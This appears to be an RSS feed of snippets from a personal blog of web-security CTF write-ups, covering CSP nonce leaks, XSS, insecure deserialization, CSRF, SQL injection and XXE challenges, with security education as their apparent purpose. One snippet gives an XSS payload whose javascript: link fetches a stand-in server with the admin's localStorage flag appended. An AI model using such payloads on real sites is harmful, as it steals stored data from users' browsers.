      <description>Lovely Nonces is a challenge from ASIS Quals 2021, involving interesting CSP bypasses and stylesheet leaks. My teammate Ming and I solved this challenge together, and a copy of the writeup (with the index.html file used in the exploit) can be found in the UBC CTF blog.
TL;DR CSS attribute selectors for a stylesheet leak of the CSP nonce combined with XSS.
Recon The CSP is implemented via a meta-tag in the DOM, and not through response header as is usually the common practise.</description>

      <description>MAAS 2 // Notes Source was the same from MAAS 1 (and will be the same for MAAS 3). MAAS 2 involved the &amp;lsquo;notes&amp;rsquo; part of MAAS, where you are prompted to register a user and afterwards add key:val attributes to yourself, give yourself a bio, or transfer key:value attributes to another user.
The provided source has some interesting code:
notes/app.py
@app.route(&amp;#39;/useraction&amp;#39;, methods=[&amp;#34;POST&amp;#34;]) def useraction(): mode = request.form.get(&amp;#34;mode&amp;#34;) username = request.</description>

      <description>Fancy Button Generator // FBG A simple xss challenge with the slightest of twists: instead of stealing admin cookies, you&amp;rsquo;re stealing admin&amp;rsquo;s localstorage values. This was possible because the admin, which was a puppetteer chrome browser, was operating in no-sandbox mode.
Insert as your payload:
title: eh link: javascript:fetch(&#39;your.server?fleg=&#39;%2B(window.localStorage.getItem(&amp;quot;flag&amp;quot;))); And report to admin. Careful with the wait times&amp;hellip;
NOTE: I first-blooded this challenge before certain measures were implemented. There were some issues with FBG throughout the competition that involved the organizers making amendments and introducing a pow to help with the stability of the infrastructure.</description>

      <description>AKA - How I spent some time reading custom partially-deobfuscated javascript code and actually used the Chrome debugger for once
DEF CON - undoubtedly the most notorious, famous and recgonized CTF out there. Even people who don&amp;rsquo;t do hacking know about DEF CON. The qualifiers, an event that took place this last weekend, ran for roughly 2 days and had 1 web challenge - which was more like reversing, but I&amp;rsquo;ll take what I can get.</description>

      <guid>https://jamvie.net/posts/2021/04/bo1lersctf-2021-lorem_ipsum/</guid>
      <description>Lorem_Ipsum gave nothing but a simple homepage that allowed you to see &amp;ldquo;animal&amp;rdquo;-ified versions of the famous lorem ipsum placeholder text.
Choose among the available animals, and notice a GET query parameter that looks something like ?animal=dogs. What if you gave it text garbage instead of an expected animal?
This is a Werkzeug debugger! What fun, since Werkzeug in development mode will give you a python console with every traceback that is reported to you when something wrong happens.</description>

      <description>Lightning Round The first few web challenges were pretty trivial so I&amp;rsquo;ll do super quick, 2-sentence descriptions on how to solve them.
Source it! Inspect source. You&amp;rsquo;ll find it.
Oinker Make an oink with the exact same content and realize that each oink has an allocated place in the webpage&amp;rsquo;s directory. (Example - inputting alert(1); leads to oink endpoint 64). Go to \oink\2 to get the flag.
Fastfox (easy way) Intended (hard) solution was escalating a JIT bug, which I will definitely research more of so expect part 2 ;) but the easy way was determining what functions were available in the scope of Bob&amp;rsquo;s jsshell.</description>

      <description>Babier CSP The challenge takes after justCTF&amp;rsquo;s similarly named challenge. We&amp;rsquo;re given an index.js file:
const express = require(&amp;#39;express&amp;#39;); const crypto = require(&amp;#34;crypto&amp;#34;); const config = require(&amp;#34;./config.js&amp;#34;); const app = express() const port = process.env.port || 3000; const SECRET = config.secret; const NONCE = crypto.randomBytes(16).toString(&amp;#39;base64&amp;#39;); const template = name =&amp;gt; ` &amp;lt;html&amp;gt; ${name === &amp;#39;&amp;#39; ? &amp;#39;&amp;#39;: `&amp;lt;h1&amp;gt;${name}&amp;lt;/h1&amp;gt;`}&amp;lt;a href=&amp;#39;#&amp;#39; id=elem&amp;gt;View Fruit&amp;lt;/a&amp;gt; &amp;lt;script nonce=${NONCE}&amp;gt; elem.onclick = () =&amp;gt; { location = &amp;#34;/?</description>

      <description>This last weekend was justCTF 2020 (delayed last year so it was held this year :P), held by justCatTheFish. Although I was focused between this and some other work, I was able to look through a few of the web challenges and will document them here.
Forgotten Name I found this on a total fluke. I wasn&amp;rsquo;t paying attention to the challenge much but the description was compelling:
I&amp;rsquo;m hesitant to attempt to nmap all known domains of justCatTheFish&amp;rsquo;s network, and so instead thought about the nature of their subdomains.</description>

      <guid>https://jamvie.net/posts/2021/01/common-web-exploits-a-guide-for-recon/</guid>
      <description>This is mainly used as a helpful recon guide to determine what vulnerabilities are available to you as an ethical hacker or CTFer. I&amp;rsquo;ve spent quite a bit of time researching these vulnerabilities and spotting their telltale signs, and I hope to share them here. These are common or more unique vulnerabilities that I have seen, executed, and researched while doing CTFs.

      <title>Insecure Deserialization: Introduction</title>
      <link>https://jamvie.net/posts/2020/12/insecure-deserialization-introduction/</link>

      <guid>https://jamvie.net/posts/2020/12/insecure-deserialization-introduction/</guid>
      <description>Insecure deserialization is a prolific vulnerability that provides a pretty straightforward gateway into unintended RCE - if you&amp;rsquo;re not careful. As of late, I&amp;rsquo;ve seen more and more CTFs employ this bug, and more real-word bug bounties deal with this kind of exploit. I figure I could provide a quick introduction into them, and hopefully ensure a few people secure their applications from this.
Context What Even is Serialization? My CPSC210 class I learned the fundamentals of object-oriented programming and the concept of complex abstractions above simple data structures: From simple arrays to instances of objects or classes, with fields and properties holding specific type values.</description>

      <description>A writeup for the first web problem, &amp;ldquo;Harmony Chat&amp;rdquo;, in DragonCTF 2020. A very fun and interesting challenge!
TL;DR  Application is vulnerable to RCE via insecure deserialization on the /csp-report endpoint Use FTP active mode to SSRF a post request to /csp-report that would open a reverse shell on the application&amp;rsquo;s HTTP server Cat flag for profit  Let&amp;rsquo;s Begin!

      <description>This is a writeup for &amp;ldquo;Confessions&amp;rdquo;, the first web challenge I solved. I was luckily able to finish this challenge in a couple hours, so I could focus my attention to the other super interesting web problems. Confessions was a nice dive into some simple GraphQL manipulation and baby crypto.
Let&amp;rsquo;s Begin! The confessions webpage was a message-generation application that would hash (in sha-256) your message based on the title and content of it.</description>

      <description>This is the first challenge I worked on. I will soon upload a post on the second one. I completed this challenge with the help of my team mentor!
Let&amp;rsquo;s Begin! The challenge lets us load into the DOM whatever we want through this pastebin-esque function. When you make a note, you have an option to share it with a &amp;ldquo;TjMike&amp;rdquo; Entity. Sign of XSS/CSRF attacks?
 My input, &amp;ldquo;uwu&amp;rdquo;, is shoved into a javascript string variable called &amp;lsquo;note&amp;rsquo;.</description>

      <guid>https://jamvie.net/posts/2020/07/cross-site-request-forgery-introduction/</guid>
      <description>Cross-Site Request Forgery is a common and prolific exploit that takes advantage of sessional cookies that browsers automatically allocate to HTTP requests - and they&amp;rsquo;re the reason you shouldn&amp;rsquo;t click suspicious links, even if the URL sort of sounds legitimate.
This is a discussion on the importance of protecting against such attacks, and to demystify the unknowns that many people have about the exploit in general. I will be using my solution for two challenges I did in the past to help explain my points - the writeups for which you can consult here as well.</description>

      <description>Part 3 of my writeup series for RedPwnCTF 2020! I checked out the web challenge known as &amp;ldquo;Viper&amp;rdquo;.
Let&amp;rsquo;s Begin! Snakes are my favourite animal. And now, you can easily create ASCII-text snakes with the handy services provided by RedPwn:
When we create our viper, its name is its viperId, which is a UUID.
The source code is available for us in this challenge as well. The main file, server.js, defines multiple endpoints - but the one that caught my eye immediately was GET /admin/create.</description>

      <description>RedPwnCTF 2020 is a beginner to intermediate CTF that&amp;rsquo;s accessible to high school and college students. The CTF featured a range of easy to harder problems, which provided both a good introduction into CTFs and an opportunity to stretch your pre-established skills. I solved through a good portion of the web problems, and will document a few of the ones here.
Let&amp;rsquo;s Begin! The problems are in no way ordered in terms of difficulty.</description>

      <description>Back in 2019 I really got into CTFs as a matter of honing my security skills. They were fun to do and enriched my knowledge of cybersecurity - so I got into it pretty quickly.
This was among the first of the challenges I did while under my team, Maple Bacon. At the time, I had plenty experience with SQL injections and XSS attacks, but not nearly enough experience with another common vulnerability: XXE attacks.</description>

      <description>I particpated in UTCTF with my team in March 2020, held and operated by the University of Texas ISSS. My team and I solved a very fun SQLi-based attack! This challenge helped me to refine my python skills cause the lord knows I needed it, as well as reinforced my knowledge about SQL-based attacks. This is the first web challenge I solved in the CTF, and admittedly the one that I enjoyed the most to do.</description>
